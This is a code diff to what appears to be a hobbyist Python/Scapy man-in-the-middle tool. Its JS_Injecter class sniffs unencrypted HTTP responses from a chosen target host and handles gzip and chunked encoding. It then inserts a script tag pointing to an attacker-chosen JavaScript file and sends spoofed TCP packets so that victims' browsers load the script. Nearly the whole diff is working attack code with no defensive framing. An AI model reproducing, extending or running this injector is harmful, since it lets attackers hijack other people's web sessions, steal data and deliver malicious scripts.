@@ -17,6 +17,11 @@
 #se envian hay un \r\d\r\d en mitad del load, y no esta mi codigo. probablemente eso haga que no funcione.
 #igual el codigo se esta añadiendo mal, o el chunked length esta cambiandose mal
 
+
+#www.badmintonarmilla.es --> chunked y gzip a la vez
+#pensar que hacer en los casos en los que está esto y no se puede descomprimir gzip
+#pensar si merece la pena sniffear la transaccion entera
+
 import threading
 import gzip
 from scapy.all import *
@@ -59,25 +64,20 @@ class Spoofed_HTTP_Load(bytes):
     
     
     ###NEW
-    def _get_header_attribute(self, attribute, load):
-        #Returns a string containing the attribute, its value and the \r\n
-        first_pos = load.find(attribute.encode())
-        if first_pos != -1:
-            last_pos = load.find(b"\r\n", first_pos) +2
-            data = load[first_pos:last_pos]
-            return data
-        return b""
-    
-    
     def _gzip_action_if_needed(self, load, action):
-        if action == "compress": action = gzip.compress
-        elif action == "decompress": action = gzip.decompress
+        if action == "compress": action_f = gzip.compress
+        elif action == "decompress": action_f = gzip.decompress
+        else: print("ERROR UNKNOWN ACTION", action); return
         
         if "gzip" in self.content_encoding_header:
             try:
-                load = action(load)
+                load = action_f(load)
             except Exception as err:
-                print("ERROR WITH GZIP ACTION:", err)
+                #Sometimes decompressing fail, because i think we can not decompress a part of
+                #a gzip string. However, this doesnt seem a problem. The injected code is
+                #attached to the compressed packet load, and then it is compressed.
+                print("ERROR WITH GZIP ACTION",action.upper(),":", err)
+                raise
         
         return load
         
@@ -87,7 +87,7 @@ class Spoofed_HTTP_Load(bytes):
             chunk_start = load.find(b"\r\n")
             
             if chunk_start == -1:
-                print("CHUNK START NOT FOUND, PROBABLY EMPTY PACKET")
+                print("CHUNK START NOT FOUND, PROBABLY EMPTY PACKET. THIS SHOULD NOT BE HAPPENING, IM NOT HANDLING EMPYT PACKETS ANYMORE.")
                 print("Returning", (self.injected_code + load).decode())
                 return self.injected_code + load 
 
@@ -109,7 +109,7 @@ class Spoofed_HTTP_Load(bytes):
     def _remove_header_attribute_if_needed(self, attr_name, load, length_needed):
         if len(load) > length_needed:
             new_load = load
-            attr_all = self._get_header_attribute(self, attr_name, new_load)
+            attr_all = packet_utilities.get_header_attribute_from_http_load(attr_name, new_load)
             if not attr_all:
                 # ~ print("Attribute", attr_name, "not found")
                 return load
@@ -149,6 +149,7 @@ class Spoofed_HTTP_Load(bytes):
             new_load = self._remove_header_attribute_if_needed(self, attr, new_load, length_needed)
         
         if len(new_load) > length_needed:
+            #This doesnt seem a problem.
             print("[ERROR] Despite having removed attributes, length was reduced from", len(load), "to", len(new_load), "and not to", length_needed, "(" + str(len(new_load)-length_needed) + " more bytes than intended)")
             # ~ print(new_load.decode("utf-8", "ignore"))
         return new_load
@@ -173,13 +174,17 @@ class Spoofed_HTTP_Load(bytes):
         
         self.injected_code = injected_code
         
-        self.content_encoding_header = self._get_header_attribute(self, "Content-Encoding", spoof_load).decode()
-        self.transfer_encoding_header = self._get_header_attribute(self, "Transfer-Encoding", spoof_load).decode()
-        
+        self.content_encoding_header = packet_utilities.get_header_attribute_from_http_load("Content-Encoding", spoof_load).decode()
+        self.transfer_encoding_header = packet_utilities.get_header_attribute_from_http_load("Transfer-Encoding", spoof_load).decode()
+        self.decompressed = False if self.content_encoding_header else True
+            
         spoof_load = spoof_load.split(b"\r\n\r\n")
         
-        
-        spoof_load[1] = self._gzip_action_if_needed(self, spoof_load[1], "decompress")
+        try:
+            spoof_load[1] = self._gzip_action_if_needed(self, spoof_load[1], "decompress")
+            self.decompressed = True
+        except Exception as err:
+            print(self.decompressed)
         
         
         spoof_load[1] = self._add_injected_code(self, spoof_load[1])
@@ -200,10 +205,10 @@ class Spoofed_HTTP_Load(bytes):
 class JS_Injecter(threading.Thread):
     """holaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa 
     jajajaaaaaaaaaaaaaa"""
-    def __init__(self, exit_event, file_loc, timeout):
+    def __init__(self, exit_event, target, file_loc, timeout):
         super().__init__()
         self.exit_event = exit_event
-        #self.file_loc = file_loc
+        self.target = target
         self.timeout = timeout
         self.injected_code = b"<script src=\"" + file_loc.encode("utf-8") + b"\"></script>\n"
 
@@ -216,11 +221,11 @@ class JS_Injecter(threading.Thread):
             self.handled_packets.append(data) 
             
     
-    def _has_packet_been_handled(self, ack, seq, tcp_checksum):
-        result = ((ack,seq,tcp_checksum) in self.handled_packets)
+    def _has_packet_been_handled(self, packet):
+        result = ((packet["TCP"].ack, packet["TCP"].seq, packet_utilities.get_checksum(packet, "TCP")) in self.handled_packets)
         return result
         
-    def send_spoofed_packet(self, real_packet):
+    def _send_spoofed_packet(self, real_packet):
         spoof_load = Spoofed_HTTP_Load(real_packet.load, self.injected_code)
 
         
@@ -250,18 +255,42 @@ class JS_Injecter(threading.Thread):
         self._add_handled_packet(spoof_packet)
         print()
         
+    
+    def _forward_http_packet(self, packet):
+        """Creates a http packet according to the original packet and sends it.
+        
+        Parameters:
+            packet (scapy.packet.Packet): the packet that will be forwarded.
+        """
+        
+        #print("forwarding get packet")
+        p = IP(dst=packet["IP"].dst, src=packet["IP"].src)/ \
+            TCP(dport=packet["TCP"].dport, sport=packet["TCP"].sport, ack=packet["TCP"].ack, seq=packet["TCP"].seq, flags=packet["TCP"].flags)/ \
+            Raw(load=packet.load)
+            
+        send(p, verbose=0)
         
     def handle_packet(self, packet):
-        if not self._has_packet_been_handled(packet["TCP"].ack, packet["TCP"].seq, packet["TCP"].chksum):
-            #print(packet["TCP"].ack, packet["TCP"].seq, packet["TCP"].chksum, "entered to:", self.handled_packets)
-            self.send_spoofed_packet(packet)
+        if not self._has_packet_been_handled(packet):
             self._add_handled_packet(packet)
             
+            if packet.load.split(b"\r\n\r\n")[1]:
+                #print(packet["TCP"].ack, packet["TCP"].seq, packet["TCP"].chksum, "entered to:", self.handled_packets)
+                self._send_spoofed_packet(packet)
+            else:
+                #Some packets are not HTTP 200 OK.
+                #Some packets arrive divided in: 1st packet http header, 2nd packet http body.
+                #If there's chunked encoding, there's nothing i can do with the first packet, which is the one I sniff.
+                #Even if the packet is not chunked, i think it's better not to mess with those packets.
+                print("EMPTY PACKET: FORWARDING")
+                self._forward_http_packet(packet)
+                
         
     def run(self):
-        print("JS Injecter started.")
+        print("JS Injecter started with target", self.target)
         
-        sniff(filter="tcp and src port 80", lfilter= lambda x: x.haslayer("TCP") and x.haslayer("Raw") and b"ype: text/html" in x.load, #T not included cause its sometimes t and sometimes T
+        #T not included in lfilter cause its sometimes t and sometimes T
+        sniff(filter="tcp and src port 80 and host " + self.target, lfilter= lambda x: x.haslayer("TCP") and x.haslayer("Raw") and b"ype: text/html" in x.load, 
               prn=self.handle_packet, stopperTimeout=3, stopper=self.exit_event.is_set, 
               timeout=self.timeout, store=False)
         
